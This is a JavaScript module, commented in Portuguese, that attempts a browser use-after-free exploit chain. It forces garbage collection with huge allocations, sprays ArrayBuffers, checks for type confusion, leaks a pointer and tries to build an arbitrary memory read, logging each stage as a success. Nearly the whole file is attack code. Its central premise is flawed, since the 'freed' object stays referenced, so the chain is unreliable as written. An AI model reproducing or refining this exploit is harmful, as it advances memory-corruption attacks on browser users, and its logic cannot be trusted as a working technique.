// js/test.bundle.mjs

// --- Importações do nosso pacote de utilitários ---
import { logToDiv, PAUSE, AdvancedInt64, toHex, getElementById } from './utils.bundle.mjs';

// --- s3_utils.mjs (mesclado) ---
export const SHORT_PAUSE_S3 = 50;
export const MEDIUM_PAUSE_S3 = 500;

export const logS3 = (message, type = 'info', funcName = '') => {
    logToDiv('output-advanced', message, type, funcName);
};

export const PAUSE_S3 = (ms = SHORT_PAUSE_S3) => PAUSE(ms);


// --- testArrayBufferVictimCrash.mjs (mesclado) ---
export const FNAME_MODULE_UAF_TEST = "UAF_R54_Hyper_GC";

function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

async function executeUAFTestChain() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_UAF_TEST;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste UAF Calibrado ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
    let dangling_ref = null;
    let spray_buffers = [];

    try {
        logS3("--- FASE 1: Limpeza Agressiva Inicial do Heap ---", "subtest");
        await triggerGC_Calibrated(); // <--- USA A NOVA FUNÇÃO CALIBRADA

        logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
        dangling_ref = sprayAndCreateDanglingPointer();
        logS3("    Ponteiro pendurado criado. A referência agora é inválida.", "warn");
        
        logS3("--- FASE 3: Múltiplas tentativas de forçar a Coleta de Lixo ---", "subtest");
        await triggerGC_Calibrated(); // <--- USA A NOVA FUNÇÃO CALIBRADA
        await PAUSE_S3(100);
        await triggerGC_Calibrated(); // <--- USA A NOVA FUNÇÃO CALIBRADA
        logS3("    Memória do objeto-alvo deve ter sido liberada.", "warn");

        logS3("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
        for (let i = 0; i < 1024; i++) {
            const buf = new ArrayBuffer(136); 
            const view = new BigUint64Array(buf);
            view[0] = 0x4141414141414141n;
            view[1] = 0x4242424242424242n;
            spray_buffers.push(buf);
        }
        logS3(`    Pulverização de ${spray_buffers.length} buffers concluída. Verificando...`, "info");

        logS3(`DEBUG: typeof dangling_ref.corrupted_prop é: ${typeof dangling_ref.corrupted_prop}`, "info");

        if (typeof dangling_ref.corrupted_prop !== 'number') {
            throw new Error(`Falha no UAF. Tipo era '${typeof dangling_ref.corrupted_prop}', esperado 'number'.`);
        }
        
        logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");

        const leaked_ptr_double = dangling_ref.corrupted_prop;
        const buf_conv = new ArrayBuffer(8);
        (new Float64Array(buf_conv))[0] = leaked_ptr_double;
        const int_view = new Uint32Array(buf_conv);
        const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);
        logS3(`Ponteiro vazado através do UAF: ${leaked_addr.toString(true)}`, "leak");
        
        logS3("--- FASE 6: Armar a confusão de tipos para Leitura/Escrita Arbitrária ---", "subtest");
        let corrupted_buffer = null;
        for (const buf of spray_buffers) {
            const view = new BigUint64Array(buf);
            if (view[0] !== 0x4141414141414141n) {
                logS3("Encontrado o ArrayBuffer corrompido!", "good");
                corrupted_buffer = buf;
                break;
            }
        }

        if (!corrupted_buffer) {
            throw new Error("Não foi possível encontrar o buffer corrompido.");
        }

        const target_address_to_read = new AdvancedInt64("0x00000000", "0x08000000"); 
        dangling_ref.prop_b = int64ToDouble(target_address_to_read);

        const hacked_view = new DataView(corrupted_buffer);
        const read_value = hacked_view.getUint32(0, true); 

        logS3(`++++++++++++ LEITURA ARBITRÁRIA BEM-SUCEDIDA! ++++++++++++`, "vuln");
        logS3(`Lido do endereço ${target_address_to_read.toString(true)}: 0x${toHex(read_value)}`, "leak");

        final_result = { 
            success: true, 
            message: "Primitiva de Leitura Arbitrária construída com sucesso via UAF!",
            leaked_addr: leaked_addr.toString(true),
            arb_read_test_value: toHex(read_value)
        };

    } catch (e) {
        final_result.message = `Exceção na cadeia UAF: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    // Retorna o resultado para o orquestrador
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        main_result: final_result,
        uaf_success: final_result.success
    };
}

// *** MODIFICADO ***
// Esta função agora lê o valor do slider no index.html
async function triggerGC_Calibrated() {
    let megabytesToAllocate = 500; // Valor padrão
    try {
        // Pega o valor do input de texto
        const inputEl = getElementById('gcMegabytesValue');
        if (inputEl && inputEl.value) {
            const val = parseInt(inputEl.value, 10);
            if (!isNaN(val) && val > 0 && val <= 2000) { // Limite de 2GB por segurança
                megabytesToAllocate = val;
            }
        }
    } catch(e) {
        logS3(`Erro ao ler valor de calibração: ${e.message}`, 'warn');
    }

    const bytesToAllocate = megabytesToAllocate * 1024 * 1024;
    logS3(`    Acionando GC Calibrado: Tentando alocar ${megabytesToAllocate} MB...`, "info");
    
    try {
        const gc_trigger_arr = [];
        // Tenta alocar um único bloco grande
        // Isto é mais rápido para forçar o GC do que o loop 'for'
        gc_trigger_arr.push(new ArrayBuffer(bytesToAllocate));
        logS3(`    Alocação de ${megabytesToAllocate} MB bem-sucedida (inesperado).`, 'warn');
    } catch (e) {
        // Este é o resultado esperado
        logS3(`    Memória esgotada durante a alocação (esperado).`, "info");
    }
    await PAUSE_S3(500); // Pausa para o GC rodar
}

function sprayAndCreateDanglingPointer() {
    let dangling_ref_internal = null;
    function createScope() {
        const victim = {
            prop_a: 0x11111111, prop_b: 0x22222222, 
            corrupted_prop: 0.12345,
            p4: 0, p5: 0, p6: 0, p7: 0, p8: 0, p9: 0, p10: 0, p11: 0, p12: 0, p13: 0, p14: 0, p15: 0,
            p16: 0, p17: 0
        };
        dangling_ref_internal = victim; 
        for(let i=0; i<100; i++) {
            victim.prop_a += 1;
        }
    }
    createScope();
    return dangling_ref_internal;
}


// --- runAllAdvancedTests (mesclado e simplificado) ---

// Esta é a função principal exportada que o index.html chama
export async function runAllAdvancedTests() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_UAF_TEST}_MainOrchestrator`;
    logS3(`==== INICIANDO Teste Principal (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    
    // O teste de conversão de tipo foi removido.
    // Inicia diretamente a estratégia de UAF.
    
    const result = await executeUAFTestChain(); 
    const module_name_for_title = FNAME_MODULE_UAF_TEST;

    // Log do resultado
    if (result.errorOccurred) {
        logS3(`  RUNNER: Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_ORCHESTRATOR);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result.uaf_success) {
        logS3(`  RUNNER: Teste UAF: ${result.main_result.message}`, "vuln", FNAME_ORCHESTRATOR);
        document.title = `${module_name_for_title}: UAF SUCCESS!`;
    } else {
        logS3(`  RUNNER: Teste UAF falhou: ${result.main_result.message}`, "warn", FNAME_ORCHESTRATOR);
        document.title = `${module_name_for_title}: UAF Fail`;
    }
    
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_ORCHESTRATOR);
    
    logS3(`\n==== Teste Principal (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    
    const runBtn = getElementById('runIsolatedTestBtn'); 
    if (runBtn) runBtn.disabled = false;
}
